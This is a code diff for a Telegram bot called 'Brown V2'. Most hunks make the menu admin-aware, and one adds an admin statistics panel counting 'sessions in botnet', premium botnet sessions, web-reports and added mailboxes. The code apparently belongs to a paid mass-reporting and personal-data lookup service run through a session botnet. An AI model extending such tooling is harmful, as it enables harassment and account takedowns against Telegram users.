@@ -684,7 +684,7 @@ async def welcome(message: types.Message, state: FSMContext):
 	await send_and_pin_site_msg(uid)
 	await bot.send_photo(uid, photo=open('material/menu.png', 'rb'),
 		caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-		parse_mode="MarkdownV2", reply_markup=menu)
+		parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 
 @dp.message_handler(state=WaitCaptchaFSM.code)
 async def check_captcha(message: types.Message, state: FSMContext):
@@ -721,7 +721,7 @@ async def check_captcha(message: types.Message, state: FSMContext):
 		await send_and_pin_site_msg(uid)
 		await bot.send_photo(uid, photo=open('material/menu.png', 'rb'),
 			caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-			parse_mode="MarkdownV2", reply_markup=menu)
+			parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 	else:
 		try:
 			code = generate_captcha_text()
@@ -764,7 +764,7 @@ async def handle_lang_select(call: types.CallbackQuery, state: FSMContext):
 	await send_and_pin_site_msg(uid)
 	await bot.send_photo(uid, photo=open('material/menu.png', 'rb'),
 		caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-		parse_mode="MarkdownV2", reply_markup=menu)
+		parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 
 
 PROBIV_HELP = (
@@ -999,7 +999,7 @@ async def start_check_sub_callback(call: types.CallbackQuery):
 		await bot.send_sticker(uid, InputFile("AnimatedSticker.tgs"))
 		await bot.send_photo(uid, photo=open('material/menu.png', 'rb'),
 			caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-			parse_mode="MarkdownV2", reply_markup=menu)
+			parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 	else:
 		await bot.answer_callback_query(call.id, "❌ Вы ещё не подписались!", show_alert=True)
 
@@ -1147,7 +1147,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 				await bot_instance.send_sticker(uid, InputFile("AnimatedSticker.tgs"))
 				await bot_instance.send_photo(uid, photo=open('material/menu.png', 'rb'),
 					caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-					parse_mode="MarkdownV2", reply_markup=menu)
+					parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 			else:
 				await bot_instance.answer_callback_query(call.id, "❌ Вы ещё не подписались!", show_alert=True)
 			return
@@ -1175,6 +1175,36 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id,
 				caption=f"*Профиль*\n\n▪️ *Имя: {fullname}*\n▪️ *ID: {uid}*\n▪️ *@{username}*\n▪️ *Премиум: {prem}*\n▪️ *Бесплатных репортов: {free_reports}*\n▪️ *Рефералов: {ref_count}*\n\n⏳ *{sub_text}*",
 				parse_mode="Markdown", reply_markup=_profile_markup)
+		elif d == 'admin_panel':
+			if uid not in admins:
+				return
+			try:
+				users_count = await db.get_users_count()
+				sessions_count = len(os.listdir(session_folder)) if os.path.exists(session_folder) else 0
+				sessions_count_prem = len(os.listdir(session_folder_prem)) if os.path.exists(session_folder_prem) else 0
+				subscribers_count = await db.get_subscribers_count()
+				mirrors_count = await db.get_mirrors_count()
+				reports_users_count = await db.get_users_with_reports_count()
+				try:
+					with open("mails.txt", "r", encoding="utf-8") as f:
+						mails_count = len([l for l in f if l.strip()])
+				except FileNotFoundError:
+					mails_count = 0
+				_adm_text = (
+					"🤖 *Админ меню:*\n\n📊 *Статистика:*\n"
+					f"*├─👥 Всего пользователей:* `{users_count}`\n"
+					f"*├─💳 С подпиской:* `{subscribers_count}`\n"
+					f"*├─🎯 С репортами:* `{reports_users_count}`\n"
+					f"*├─🪞 Зеркал:* `{mirrors_count}`\n"
+					f"*├─🕒 Сессий в ботнете:* `{sessions_count}`\n"
+					f"*├─👑 Сессий в премиум ботнете:* `{sessions_count_prem}`\n"
+					f"*├─🌐 Web-Reports:* `{report_count333}`\n"
+					f"*└─✉️ Почт добавлено:* `{mails_count}`"
+				)
+				await bot_instance.send_message(call.message.chat.id, _adm_text, reply_markup=keyboards.admin_markup, parse_mode="Markdown")
+			except Exception as _e:
+				await bot_instance.send_message(call.message.chat.id, f"❌ Ошибка: `{str(_e)[:200]}`", parse_mode="Markdown")
+
 		elif d == 'profile_history':
 			history = await db.get_attack_history(uid, limit=15)
 			_METHOD_LABELS = {
@@ -1224,7 +1254,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			try:
 				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id,
 					caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-					parse_mode="MarkdownV2", reply_markup=menu)
+					parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 			except Exception:
 				try:
 					await bot_instance.delete_message(call.message.chat.id, call.message.message_id)
@@ -1232,7 +1262,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 					pass
 				await bot_instance.send_photo(call.message.chat.id, photo=open('material/menu.png', 'rb'),
 					caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*',
-					parse_mode="MarkdownV2", reply_markup=menu)
+					parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 			# Сбрасываем FSM состояние если есть
 			try:
 				current = await state.get_state()
@@ -1324,7 +1354,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 		elif d == "go_to_main_menu":
 			await bot_instance.delete_message(call.message.chat.id, call.message.message_id)
 			await bot_instance.send_photo(call.message.chat.id, photo=open('material/menu.png', 'rb'),
-				caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*', parse_mode="MarkdownV2", reply_markup=menu)
+				caption='>*Добро пожаловать в Brown V2\!*\n\n*Меню:*', parse_mode="MarkdownV2", reply_markup=keyboards.get_menu(uid in admins))
 
 		# ─── Мониторинг ────────────────────────────────────────────────────────
 		elif d == 'media':
@@ -1636,7 +1666,7 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await _log_admin_action(uid, username, "Нажал «Забрать премиум»")
 			await bot_instance.send_message(call.message.chat.id, '🎱 *Сброс премиума*\n*└─Введите ID или @username:*', parse_mode="Markdown")
 			await dp_instance.current_state(chat=uid, user=uid).set_state(ClearPremFSM.user_id.state)
-		elif d == 'send_all' and uid in admins and uid in admins2:
+		elif d == 'send_all' and uid in admins:
 			await bot_instance.send_message(call.message.chat.id, '🎱 *Рассылка*\n*└─Введите текст:*', parse_mode="Markdown")
 			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitTextZFSM.text.state)
 		elif d == 'block_user_admin' and uid in admins:
